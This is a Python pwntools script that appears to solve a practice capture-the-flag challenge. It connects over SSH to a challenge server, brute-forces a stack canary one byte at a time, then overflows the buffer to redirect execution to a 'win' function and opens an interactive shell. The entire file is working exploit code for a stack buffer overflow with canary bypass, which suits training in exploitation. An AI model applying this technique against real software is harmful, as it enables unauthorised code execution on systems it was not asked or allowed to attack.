from pwn import *

s = ssh(host='node4.buuoj.cn', port=29718, user='CTFMan', password='guest')

win_addr = 0x80486eb
payload = b'a'*0x20
offset_to_cannary = 32
for i in range(1,5):
    for j in range(256):
        p = s.run('./vuln')
        p.sendlineafter(b'Buffer?\n>', str(offset_to_cannary+i))
        cannary_one_byte = bytes([j])
        send_payload = payload + cannary_one_byte
        # p.info('try {:d} in {:s}'.format(j, send_payload.decode()))
        p.sendlineafter(b'Input> ', send_payload)
        if b'Stack Smashing Detected' in p.recv():
            continue
        payload += cannary_one_byte
        print('cannary[{:d}]: 0x{}'.format(i-1, cannary_one_byte.hex()))
        break

log.info('canary: 0x{}'.format(payload[-4:].hex()))
payload = payload.ljust(0x30+4, b'a')
payload += p32(win_addr)

p = s.run('./vuln')
p.sendlineafter(b'Buffer?\n>', str(0x30+4+4))
p.sendlineafter(b'Input> ', payload)

p.interactive()